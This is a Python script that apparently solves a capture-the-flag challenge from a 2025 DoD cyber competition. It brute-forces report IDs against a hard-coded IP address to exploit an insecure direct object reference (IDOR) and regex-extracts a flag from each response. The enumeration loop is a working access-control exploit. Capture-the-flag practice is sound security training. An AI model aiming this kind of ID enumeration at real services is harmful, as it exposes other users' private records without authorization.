"""

    2025 DoD Cyber Sentinel Challenge: Field Report Mayhem 
    ======================================================

    The field report has the number 1337.  Leet (or "1337"),
    also known as eleet, leetspeak, or simply hacker speech.
    Create a generator to find field report. 

    1337:
    
        https://en.wikipedia.org/wiki/Leet

    Insecure direct object references (IDOR):
    
        https://en.wikipedia.org/wiki/Insecure_direct_object_reference
        https://portswigger.net/web-security/access-control/idor
    
"""

import requests
import time
import re

def altgen(n, t):
    """
    generator for aternating numbers: [1235, 1233, 1236, 1232, 1237 ...]
    
    """
    a=0
    while a < t:
        if a == 0:
            pass
        else:
            yield n + a
            u = n - a
            if u > 999:
                yield u
        a += 1

w=4
ip="35.245.106.190"
p=1234
g=1e5 - p - 1

for n in altgen(p, g):
    url=f'http://{ip}/reports.php?id={n}&code=UV12WX/'
    try:
        res=requests.get(url, timeout=w)
    except requests.RequestException:
        print(f'Not found: {n}')
        time.sleep(w)
        continue
    if res.status_code == 200:
        c=res.text
        print(f"\n=== found: {n} ===")
        #print(c) #use as necessary
        m=re.search(r'C1\{.*?\}', c)
        f=m.group(0) if m else None
        if f:
            print(f"\n=== flag found at {n}: {f} ===")
            break
        time.sleep(w)
        
